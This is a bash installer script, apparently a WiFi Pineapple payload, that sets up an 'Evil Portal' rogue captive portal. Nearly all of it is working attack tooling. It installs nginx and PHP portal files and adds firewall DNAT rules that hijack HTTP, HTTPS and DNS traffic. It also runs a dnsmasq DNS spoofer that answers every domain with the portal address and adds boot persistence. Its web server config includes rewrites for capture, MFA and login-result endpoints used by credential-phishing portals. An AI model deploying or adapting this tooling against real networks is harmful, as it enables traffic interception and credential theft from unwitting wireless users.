#!/bin/bash
# Name: Install Evil Portal
# Description: Complete Evil Portal installation for WiFi Pineapple Pager (OpenWrt 24.10.1)
# Author: PentestPlaybook
# Version: 2.0
# Category: Evil Portal

# ====================================================================
# STEP 0: Ask About Isolated Subnet Configuration
# ====================================================================
DIALOG_RESULT=$(CONFIRMATION_DIALOG "Configure isolated subnet? (recommended)")
if [ "$DIALOG_RESULT" = "1" ]; then
    # Check if wlan0wpa exists and is active
    if ! iwinfo wlan0wpa info &>/dev/null; then
        LOG "ERROR: Evil WPA (wlan0wpa) must be enabled before configuring isolated subnet"
        LOG "Please enable Evil WPA in the Pineapple settings and run this payload again"
        exit 1
    fi

    # YES selected - use isolated network
    PORTAL_IP="10.0.0.1"
    BRIDGE_IF="br-evil"
    
    LOG "=============================================="
    LOG "Configuring Isolated Evil Network..."
    LOG "=============================================="
    
    # Add evil network configuration with wlan0wpa as bridge port
    LOG "Creating br-evil bridge and interface..."
    echo -e "\nconfig device\n        option name 'br-evil'\n        option type 'bridge'\n\nconfig interface 'evil'\n        option device 'br-evil'\n        option proto 'static'\n        option ipaddr '10.0.0.1'\n        option netmask '255.255.255.0'" >> /etc/config/network
    
    # Add DHCP configuration for evil network
    LOG "Configuring DHCP for evil network..."
    echo -e "\nconfig dhcp 'evil'\n        option interface 'evil'\n        option start '100'\n        option limit '150'\n        option leasetime '1h'" >> /etc/config/dhcp
    
    # Assign wlan0wpa to evil network
    LOG "Assigning wlan0wpa to evil network..."
    uci set wireless.wlan0wpa.network='evil'
    uci commit wireless
    
    # Remove wlan0wpa from br-lan bridge
    LOG "Removing wlan0wpa from br-lan..."
    uci del_list network.brlan.ports='wlan0wpa'
    uci commit network
    
    # Add evil network to firewall with separate zone
    LOG "Adding evil network to firewall..."
    # Create separate zone for evil network
    uci add firewall zone
    uci set firewall.@zone[-1].name='evil'
    uci set firewall.@zone[-1].network='evil'
    uci set firewall.@zone[-1].input='ACCEPT'
    uci set firewall.@zone[-1].output='ACCEPT'
    uci set firewall.@zone[-1].forward='REJECT'
    
    # Allow evil zone to forward to wan for internet access
    uci add firewall forwarding
    uci set firewall.@forwarding[-1].src='evil'
    uci set firewall.@forwarding[-1].dest='wan'
    
    uci commit firewall
    
    LOG "SUCCESS: Isolated subnet configured"
    LOG ""
else
    # NO selected - use main network
    PORTAL_IP="172.16.52.1"
    BRIDGE_IF="br-lan"
    
    LOG "Skipping isolated subnet configuration..."
    LOG "Using main network: ${BRIDGE_IF} (${PORTAL_IP})"
    LOG ""
fi
LOG "Starting Evil Portal installation for WiFi Pineapple Pager..."
LOG "Portal IP: ${PORTAL_IP}"
LOG "Bridge Interface: ${BRIDGE_IF}"

# ====================================================================
# Check Internet Connectivity
# ====================================================================
LOG "Checking internet connectivity..."
if ! ping -c1 google.com &>/dev/null; then
    LOG "ERROR: No internet connectivity detected"
    LOG "WiFi Client Mode not enabled. Enable WiFi Client Mode and try again."
    LOG "If it is already enabled, 1) verify wifi client configuration and 2) confirm your Pager can ping google.com"
    exit 1
fi
LOG "Internet connectivity confirmed"

# ====================================================================
# STEP 1: Install Required Packages
# ====================================================================
LOG "Step 1: Checking and installing required packages..."

# Check which packages need to be installed
PACKAGES_NEEDED=""

# Check PHP packages
if ! opkg list-installed | grep -q "^php8 "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED php8"
fi
if ! opkg list-installed | grep -q "^php8-fpm "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED php8-fpm"
fi
if ! opkg list-installed | grep -q "^php8-mod-curl "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED php8-mod-curl"
fi
if ! opkg list-installed | grep -q "^php8-mod-sqlite3 "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED php8-mod-sqlite3"
fi

# Check nginx packages
if ! opkg list-installed | grep -q "^nginx-full "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED nginx-full"
fi
if ! opkg list-installed | grep -q "^nginx-ssl-util "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED nginx-ssl-util"
fi
if ! opkg list-installed | grep -q "^zoneinfo-core "; then
    PACKAGES_NEEDED="$PACKAGES_NEEDED zoneinfo-core"
fi

# Install only if packages are missing
if [ -n "$PACKAGES_NEEDED" ]; then
    LOG "Updating package lists..."
    opkg update
    
    LOG "Installing missing packages:$PACKAGES_NEEDED"
    opkg install $PACKAGES_NEEDED
    
    # Verify critical packages installed successfully
    if ! opkg list-installed | grep -q "php8-fpm"; then
        LOG "ERROR: PHP8-FPM installation failed"
        exit 1
    fi

    if ! opkg list-installed | grep -q "nginx-full"; then
        LOG "ERROR: nginx-full installation failed"
        exit 1
    fi
    
    LOG "SUCCESS: All missing packages installed"
else
    LOG "SUCCESS: All required packages already installed (skipping installation)"
fi

# Apply network changes now that packages are installed
if [ "$BRIDGE_IF" = "br-evil" ]; then
    LOG "Applying network changes for isolated subnet..."
    /etc/init.d/network restart
    sleep 10
    wifi
    # Verify connectivity before proceeding
    LOG "Waiting for network connectivity..."
    until ping -c1 downloads.openwrt.org &>/dev/null; do sleep 2; done
    LOG "SUCCESS: Network connectivity restored"
fi

# ====================================================================
# STEP 2: Create Evil Portal API Files
# ====================================================================
LOG "Step 2: Creating Evil Portal API backend..."
mkdir -p /pineapple/ui/modules/evilportal/assets/api

LOG "Creating index.php..."
cat > /pineapple/ui/modules/evilportal/assets/api/index.php << 'EOF'
<?php namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header('Content-Type: application/json');

require_once("API.php");
$api = new API();
echo $api->go();
EOF

LOG "Creating API.php..."
cat > /pineapple/ui/modules/evilportal/assets/api/API.php << 'EOF'
<?php namespace evilportal;

class API
{
    private $request;
    private $error;

    public function __construct()
    {
        $this->request = (object)$_POST;
    }

    public function route()
    {
        $portalPath = "/www/MyPortal.php";
        $portalClass = "evilportal\\MyPortal";

        if (!file_exists($portalPath)) {
            $this->error = "MyPortal.php does not exist in {$portalPath}";
            return;
        }

        require_once("Portal.php");
        require_once($portalPath);

        if (!class_exists($portalClass)) {
            $this->error = "The class {$portalClass} does not exist in {$portalPath}";
            return;
        }

        $portal = new $portalClass($this->request);
        $portal->handleAuthorization();
        $this->response = $portal->getResponse();
    }

    public function finalize()
    {
        if ($this->error) {
            return json_encode(array("error" => $this->error));
        } elseif ($this->response) {
            return json_encode($this->response);
        }
    }

    public function go()
    {
        $this->route();
        return $this->finalize();
    }
}
EOF

LOG "Creating Portal.php..."
cat > /pineapple/ui/modules/evilportal/assets/api/Portal.php << 'EOF'
<?php namespace evilportal;

abstract class Portal
{
    protected $request;
    protected $response;
    protected $error;

    protected $AUTHORIZED_CLIENTS_FILE = "/tmp/EVILPORTAL_CLIENTS.txt";

    public function __construct($request)
    {
        $this->request = $request;
    }

    public function getResponse()
    {
        if (empty($this->error) && !empty($this->response)) {
            return $this->response;
        } elseif (empty($this->error) && empty($this->response)) {
            return array('error' => 'API returned empty response');
        } else {
            return array('error' => $this->error);
        }
    }

    protected final function execBackground($command)
    {
        exec("echo \"{$command}\" | at now");
    }

    protected final function notify($message)
    {
        $this->execBackground("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info '{$message}' evilportal");
    }

    protected final function writeLog($message)
    {
        try {
            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            file_put_contents("{$logPath}/.logs", "{$message}\n", FILE_APPEND);
        } catch (\ReflectionException $e) {
            // do nothing.
        }
    }

    protected function authorizeClient($clientIP)
    {
        if (!$this->isClientAuthorized($clientIP)) {
            // Just write to file - daemon will add nft rule
            file_put_contents($this->AUTHORIZED_CLIENTS_FILE, "{$clientIP}\n", FILE_APPEND);
        }
        return true;
    }

    protected function handleAuthorization()
    {
        if ($this->isClientAuthorized($_SERVER['REMOTE_ADDR']) and isset($this->request->target)) {
            $this->redirect();
         } elseif (isset($this->request->target)) {
             $this->authorizeClient($_SERVER['REMOTE_ADDR']);
             $this->onSuccess();
             $this->redirect();
         } else {
             $this->showError();
         }
    }

    protected function redirect()
    {
        header("Location: {$this->request->target}", true, 302);
    }

    protected function onSuccess()
    {
        $this->notify("New client authorized through EvilPortal!");
    }

    protected function showError()
    {
        echo "You have not been authorized.";
    }

    protected function isClientAuthorized($clientIP)
    {
        $authorizeClients = file_get_contents($this->AUTHORIZED_CLIENTS_FILE);
        return strpos($authorizeClients, $clientIP);
    }
}
EOF

LOG "SUCCESS: API files created"

# ====================================================================
# STEP 3: Create Portal Files
# ====================================================================
LOG "Step 3: Creating portal interface files..."
mkdir -p /root/portals/Default

LOG "Creating index.php..."
cat > /root/portals/Default/index.php << 'EOF'
<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');

?>

<HTML>
    <HEAD>
        <title>Evil Portal</title>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </HEAD>

    <BODY>
        <div style="text-align: center;">
            <h1>Evil Portal</h1>
            <p>This is the default Evil Portal page.</p>
            <p>The SSID you are connected to is <?=getClientSSID($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your host name is <?=getClientHostName($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your MAC Address is <?=getClientMac($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your internal IP address is <?=$_SERVER['REMOTE_ADDR'];?></p>

            <form method="POST" action="/captiveportal/index.php">
                <input type="hidden" name="target" value="<?=$destination?>">
                <button type="submit">Authorize</button>
            </form>

        </div>

    </BODY>

</HTML>
EOF

LOG "Creating MyPortal.php..."
cat > /root/portals/Default/MyPortal.php << 'EOF'
<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
EOF

LOG "Creating helper.php..."
cat > /root/portals/Default/helper.php << 'EOF'
<?php

function getClientMac($clientIP)
{
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print $2}'"));
}

function getClientSSID($clientIP)
{
    if (file_exists("/tmp/log.db"))
    {
        $mac = strtoupper(getClientMac($clientIP));
        $db = new SQLite3("/tmp/log.db");
        $results = $db->query("select ssid from log WHERE mac = '{$mac}' AND log_type = 0 ORDER BY updated_at DESC LIMIT 1;");
        $ssid = '';
        while($row = $results->fetchArray())
        {
            $ssid = $row['ssid'];
            break;
        }
        $db->close();
        return $ssid;
    }
    return '';
}

function getClientHostName($clientIP)
{
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print $4}'"));
}
EOF

LOG "Creating Default.ep..."
cat > /root/portals/Default/Default.ep << 'EOF'
{
  "name": "Default",
  "type": "basic"
}
EOF

LOG "Creating generate_204.html (Android)..."
cat > /root/portals/Default/generate_204.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

LOG "Creating hotspot-detect.html (iOS/macOS)..."
cat > /root/portals/Default/hotspot-detect.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

LOG "SUCCESS: Portal files created"

# ====================================================================
# STEP 4: Configure nginx
# ====================================================================
LOG "Step 4: Configuring nginx web server..."
cat > /etc/nginx/nginx.conf << 'EOF'
user root root;
worker_processes  1;
events {
    worker_connections  1024;
}
http {
        include mime.types;
        index index.php;
        default_type text/html;
        sendfile on;
        keepalive_timeout 65;
        gzip on;
        gzip_min_length  1k;
        gzip_buffers     4 16k;
        gzip_http_version 1.0;
        gzip_comp_level 2;
        gzip_types       text/plain application/x-javascript text/css application/xml;
        gzip_vary on;
        server {
                listen       80;
                server_name  www;
                error_log /root/elog;
                access_log /dev/null;
                fastcgi_connect_timeout 300;
                fastcgi_send_timeout 300;
                fastcgi_read_timeout 300;
                fastcgi_buffer_size 32k;
                fastcgi_buffers 4 32k;
                fastcgi_busy_buffers_size 32k;
                fastcgi_temp_file_write_size 32k;
                client_body_timeout 10;
                client_header_timeout 10;
                send_timeout 60;
                output_buffers 1 32k;
                postpone_output 1460;
                root   /www;

                rewrite ^/capture$ /helper.php last;
                rewrite ^/mfa_result$ /mfa_result.php last;
                rewrite ^/mfa_status$ /mfa_status.php last;
                rewrite ^/login_result$ /login_result.php last;

                location ~ \.php$ {
                        fastcgi_split_path_info ^(.+\.php)(/.+)$;
                        fastcgi_pass unix:/var/run/php8-fpm.sock;
                        fastcgi_index index.php;
                        include fastcgi_params;
                        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                }
                error_page 404 =200 /index.php;
        }
}
EOF

LOG "Testing nginx configuration..."
nginx -t
if [ $? -ne 0 ]; then
    LOG "ERROR: nginx configuration test failed"
    exit 1
fi

LOG "SUCCESS: nginx configured"

# ====================================================================
# STEP 5: Disable UCI nginx and Fix Permissions
# ====================================================================
LOG "Step 5: Disabling UCI nginx and setting permissions..."
uci set nginx.global.uci_enable=false
uci commit nginx

chmod 755 /root
chmod -R 755 /root/portals/

# Create logs directory with write permissions for PHP-FPM (runs as nobody)
mkdir -p /root/logs
chmod 777 /root/logs

LOG "SUCCESS: Permissions configured"

# ====================================================================
# STEP 6: Create Init Script and Whitelist Daemon
# ====================================================================
LOG "Step 6: Creating Evil Portal init script..."

# Determine source zone for firewall rules based on isolated subnet choice
if [ "$BRIDGE_IF" = "br-evil" ]; then
    FIREWALL_SRC="evil"
else
    FIREWALL_SRC="lan"
fi

cat > /etc/init.d/evilportal << INITEOF
#!/bin/sh /etc/rc.common

START=99

# Helper function to add temporary nft rules directly to dstnat chain
# (dstnat always exists, dstnat_lan only exists when UCI rules are present)
add_nft_rules() {
    # Add TEMPORARY nftables rules to the main dstnat chain with interface match
    # These disappear on reboot since they're not in UCI config
    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 tcp dport 443 counter dnat ip to ${PORTAL_IP}:80
    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 tcp dport 80 counter dnat ip to ${PORTAL_IP}:80
    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 tcp dport 53 counter dnat ip to ${PORTAL_IP}:5353
    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 udp dport 53 counter dnat ip to ${PORTAL_IP}:5353
}

# Helper function to remove nft rules from memory
remove_nft_rules() {
    # Remove temporary rules from dstnat chain (the ones we added with iifname match)
    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "dnat ip to ${PORTAL_IP}" | awk '{print \$NF}' | while read handle; do
        nft delete rule inet fw4 dstnat handle "\$handle" 2>/dev/null
    done

    # Also remove from dstnat_lan if it exists (for UCI-created rules)
    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "dnat ip to ${PORTAL_IP}" | awk '{print \$NF}' | while read handle; do
        nft delete rule inet fw4 dstnat_lan handle "\$handle" 2>/dev/null
    done
    
    # Also remove from dstnat_evil if it exists
    nft -a list chain inet fw4 dstnat_evil 2>/dev/null | grep "dnat ip to ${PORTAL_IP}" | awk '{print \$NF}' | while read handle; do
        nft delete rule inet fw4 dstnat_evil handle "\$handle" 2>/dev/null
    done
}

# Helper function to remove whitelist rules
remove_whitelist_rules() {
    # Remove from dstnat chain
    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
        nft delete rule inet fw4 dstnat handle "\$handle" 2>/dev/null
    done

    # Also remove from dstnat_lan if it exists
    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
        nft delete rule inet fw4 dstnat_lan handle "\$handle" 2>/dev/null
    done
    
    # Also remove from dstnat_evil if it exists
    nft -a list chain inet fw4 dstnat_evil 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
        nft delete rule inet fw4 dstnat_evil handle "\$handle" 2>/dev/null
    done
}

# Helper function to start services
start_services() {
    echo 1 > /proc/sys/net/ipv4/ip_forward
    rm -f /tmp/EVILPORTAL_CLIENTS.txt /tmp/EVILPORTAL_PROCESSED.txt
    touch /tmp/EVILPORTAL_CLIENTS.txt
    chmod 666 /tmp/EVILPORTAL_CLIENTS.txt
    /etc/init.d/php8-fpm start
    /etc/init.d/nginx start
    kill \$(netstat -plant 2>/dev/null | grep ':5353' | awk '{print \$NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
    dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} -p 5353 &
    rm -f /www/captiveportal
    ln -s /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
    ln -sf /root/portals/Default/index.php /www/index.php
    ln -sf /root/portals/Default/MyPortal.php /www/MyPortal.php
    ln -sf /root/portals/Default/helper.php /www/helper.php
	ln -sf /root/portals/Default/generate_204.html /www/generate_204
    ln -sf /root/portals/Default/hotspot-detect.html /www/hotspot-detect.html

    # Start whitelist daemon
    /usr/bin/evilportal-whitelist-daemon &
}

# Helper function to stop services
stop_services() {
    /etc/init.d/php8-fpm stop
    /etc/init.d/nginx stop
    kill \$(netstat -plant 2>/dev/null | grep ':5353' | awk '{print \$NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
    killall evilportal-whitelist-daemon 2>/dev/null
    rm -f /www/captiveportal /www/index.php /www/MyPortal.php /www/helper.php /www/generate_204 /www/hotspot-detect.html

    # Remove whitelist rules
    remove_whitelist_rules
}

start() {
    # Add TEMPORARY nft rules (disappear on reboot)
    add_nft_rules

    # Start services
    start_services

    logger -t evilportal "Evil Portal started (temporary - will not persist after reboot)"
}

stop() {
    # Stop services
    stop_services

    # Remove nft rules from memory
    remove_nft_rules

    logger -t evilportal "Evil Portal stopped"
}

restart() {
    stop
    sleep 2
    start
}

enable() {
    # Add PERSISTENT firewall NAT rules via UCI
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='Evil Portal HTTPS'
    uci set firewall.@redirect[-1].src='${FIREWALL_SRC}'
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='443'
    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
    uci set firewall.@redirect[-1].dest_port='80'
    uci set firewall.@redirect[-1].target='DNAT'

    uci add firewall redirect
    uci set firewall.@redirect[-1].name='Evil Portal HTTP'
    uci set firewall.@redirect[-1].src='${FIREWALL_SRC}'
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='80'
    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
    uci set firewall.@redirect[-1].dest_port='80'
    uci set firewall.@redirect[-1].target='DNAT'

    uci add firewall redirect
    uci set firewall.@redirect[-1].name='Evil Portal DNS TCP'
    uci set firewall.@redirect[-1].src='${FIREWALL_SRC}'
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='53'
    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
    uci set firewall.@redirect[-1].dest_port='5353'
    uci set firewall.@redirect[-1].target='DNAT'

    uci add firewall redirect
    uci set firewall.@redirect[-1].name='Evil Portal DNS UDP'
    uci set firewall.@redirect[-1].src='${FIREWALL_SRC}'
    uci set firewall.@redirect[-1].proto='udp'
    uci set firewall.@redirect[-1].src_dport='53'
    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
    uci set firewall.@redirect[-1].dest_port='5353'
    uci set firewall.@redirect[-1].target='DNAT'

    uci commit firewall

    # Create boot symlink
    ln -sf /etc/init.d/evilportal /etc/rc.d/S99evilportal

    logger -t evilportal "Evil Portal enabled (will start on next reboot)"
}

disable() {
    # Remove boot symlink
    rm -f /etc/rc.d/*evilportal

    # Remove PERSISTENT firewall NAT rules from UCI - delete from highest index to lowest
    while uci show firewall | grep -q "Evil Portal"; do
        # Get the last (highest index) redirect rule containing "Evil Portal"
        LAST_INDEX=\$(uci show firewall | grep "redirect\[" | grep "Evil Portal" | tail -n1 | sed 's/.*redirect\[\([0-9]*\)\].*/\1/')
        if [ -n "\$LAST_INDEX" ]; then
            uci delete firewall.@redirect[\$LAST_INDEX]
        else
            break
        fi
    done

    uci commit firewall

    logger -t evilportal "Evil Portal disabled (will not start on next reboot)"
}
INITEOF

chmod +x /etc/init.d/evilportal

LOG "Creating whitelist daemon..."
cat > /usr/bin/evilportal-whitelist-daemon << 'EOF'
#!/bin/sh

CLIENTS_FILE="/tmp/EVILPORTAL_CLIENTS.txt"
PROCESSED_FILE="/tmp/EVILPORTAL_PROCESSED.txt"

# Create processed file if it doesn't exist
touch "$PROCESSED_FILE"

while true; do
    if [ -f "$CLIENTS_FILE" ]; then
        # Read each IP from clients file
        while read -r ip; do
            # Skip if already processed
            if ! grep -q "^${ip}$" "$PROCESSED_FILE" 2>/dev/null; then
                # Add nft rule - use dstnat chain directly (always exists)
                nft insert rule inet fw4 dstnat ip saddr "$ip" accept
                # Mark as processed
                echo "$ip" >> "$PROCESSED_FILE"
                logger -t evilportal "Whitelisted client: $ip"
            fi
        done < "$CLIENTS_FILE"
    fi
    sleep 2
done
EOF

chmod +x /usr/bin/evilportal-whitelist-daemon

LOG "SUCCESS: Init script and daemon created"

# ====================================================================
# STEP 7: Configure Firewall NAT Rules
# ====================================================================
LOG "Step 7: Configuring firewall NAT rules..."

# Determine source zone based on isolated subnet choice
if [ "$BRIDGE_IF" = "br-evil" ]; then
    FIREWALL_SRC="evil"
else
    FIREWALL_SRC="lan"
fi

uci add firewall redirect
uci set firewall.@redirect[-1].name='Evil Portal HTTPS'
uci set firewall.@redirect[-1].src="${FIREWALL_SRC}"
uci set firewall.@redirect[-1].proto='tcp'
uci set firewall.@redirect[-1].src_dport='443'
uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
uci set firewall.@redirect[-1].dest_port='80'
uci set firewall.@redirect[-1].target='DNAT'

uci add firewall redirect
uci set firewall.@redirect[-1].name='Evil Portal HTTP'
uci set firewall.@redirect[-1].src="${FIREWALL_SRC}"
uci set firewall.@redirect[-1].proto='tcp'
uci set firewall.@redirect[-1].src_dport='80'
uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
uci set firewall.@redirect[-1].dest_port='80'
uci set firewall.@redirect[-1].target='DNAT'

uci add firewall redirect
uci set firewall.@redirect[-1].name='Evil Portal DNS TCP'
uci set firewall.@redirect[-1].src="${FIREWALL_SRC}"
uci set firewall.@redirect[-1].proto='tcp'
uci set firewall.@redirect[-1].src_dport='53'
uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
uci set firewall.@redirect[-1].dest_port='5353'
uci set firewall.@redirect[-1].target='DNAT'

uci add firewall redirect
uci set firewall.@redirect[-1].name='Evil Portal DNS UDP'
uci set firewall.@redirect[-1].src="${FIREWALL_SRC}"
uci set firewall.@redirect[-1].proto='udp'
uci set firewall.@redirect[-1].src_dport='53'
uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
uci set firewall.@redirect[-1].dest_port='5353'
uci set firewall.@redirect[-1].target='DNAT'

uci commit firewall

LOG "Restarting firewall..."
/etc/init.d/firewall restart

LOG "SUCCESS: Firewall rules configured"

# ====================================================================
# STEP 8: Start Services
# ====================================================================
LOG "Step 8: Starting Evil Portal services..."

/etc/init.d/php8-fpm restart
/etc/init.d/nginx restart

LOG "Waiting for services to start..."
sleep 3

# Verify services are running
if ! pgrep php8-fpm > /dev/null; then
    LOG "ERROR: PHP8-FPM failed to start"
    exit 1
fi

if ! pgrep nginx > /dev/null; then
    LOG "ERROR: nginx failed to start"
    exit 1
fi

LOG "Starting Evil Portal..."
/etc/init.d/evilportal start

LOG "Waiting for Evil Portal to start..."
sleep 3

# Verify Evil Portal components
if ! pgrep -f "evilportal-whitelist-daemon" > /dev/null; then
    LOG "WARNING: Whitelist daemon not running"
fi

if ! pgrep -f "dnsmasq.*5353" > /dev/null; then
    LOG "WARNING: DNS spoof daemon not running"
fi

# ====================================================================
# STEP 9: Enable at Boot
# ====================================================================
LOG "Step 9: Enabling Evil Portal at boot..."
ln -sf /etc/init.d/evilportal /etc/rc.d/S99evilportal

if [ -L "/etc/rc.d/S99evilportal" ]; then
    LOG "SUCCESS: Evil Portal enabled at boot"
else
    LOG "WARNING: Failed to create boot symlink"
fi

# ====================================================================
# STEP 10: Verification
# ====================================================================
LOG "Step 10: Running verification tests..."

# Test portal HTTP response
LOG "Testing portal HTTP response..."
if curl -s http://${PORTAL_IP}/ | grep -q "Evil Portal"; then
    LOG "SUCCESS: Portal HTTP responding"
else
    LOG "WARNING: Portal HTTP not responding correctly"
fi

# Verify NAT rules exist
LOG "Verifying NAT rules..."
if nft list ruleset 2>/dev/null | grep -q "dnat ip to ${PORTAL_IP}"; then
    LOG "SUCCESS: NAT rules configured"
else
    LOG "ERROR: NAT rules not found"
    exit 1
fi

# Verify symlinks
LOG "Verifying symlinks..."
if [ -L "/www/index.php" ] && [ -L "/www/captiveportal" ]; then
    LOG "SUCCESS: Symlinks created"
else
    LOG "WARNING: Some symlinks may be missing"
fi

# ====================================================================
# Installation Complete
# ====================================================================
LOG "=================================================="
LOG "Evil Portal Installation Complete!"
LOG "=================================================="
LOG "Portal URL: http://${PORTAL_IP}/"
LOG "Bridge Interface: ${BRIDGE_IF}"
LOG "Services Status:"
LOG "  - PHP-FPM: $(pgrep php8-fpm > /dev/null && echo 'Running' || echo 'Stopped')"
LOG "  - nginx: $(pgrep nginx > /dev/null && echo 'Running' || echo 'Stopped')"
LOG "  - dnsmasq (5353): $(pgrep -f 'dnsmasq.*5353' > /dev/null && echo 'Running' || echo 'Stopped')"
LOG "  - Whitelist Daemon: $(pgrep -f evilportal-whitelist-daemon > /dev/null && echo 'Running' || echo 'Stopped')"
LOG ""
LOG "Portal files: /root/portals/Default/"
LOG "API files: /pineapple/ui/modules/evilportal/assets/api/"
LOG "Init script: /etc/init.d/evilportal"
LOG ""
LOG "Management commands:"
LOG "  Enable:  /etc/init.d/evilportal enable   (Portal ON after reboot)"
LOG "  Disable: /etc/init.d/evilportal disable  (Portal OFF after reboot)"
LOG "  Start:   /etc/init.d/evilportal start    (Portal ON now)"
LOG "  Stop:    /etc/init.d/evilportal stop     (Portal OFF now)"
LOG "  Restart: /etc/init.d/evilportal restart  (restart portal)"
LOG "=================================================="

exit 0
